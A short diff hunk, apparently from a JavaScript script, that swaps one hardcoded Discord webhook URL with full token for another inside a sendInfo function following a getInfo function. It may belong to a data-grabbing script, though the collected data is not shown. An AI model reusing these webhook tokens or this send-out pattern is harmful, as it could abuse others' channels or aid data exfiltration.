@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1312071037378105415/W5pJyeZIqt-C6RKOxUVyGnEKnmiXSwBoUy8eVr9S6qDHF4BpECj2-9SLnVR3CCv0589i";webhook
+  const webhook = "https://discord.com/api/webhooks/1339114727846182913/kRDSBYVyLQ0cjE_MZxaE1ZRZStG3yK5OwfqqnjO5BVRCEOu2eM9rNY7COvnc4seV9mNT";webhook
 
 
   const embed  = {
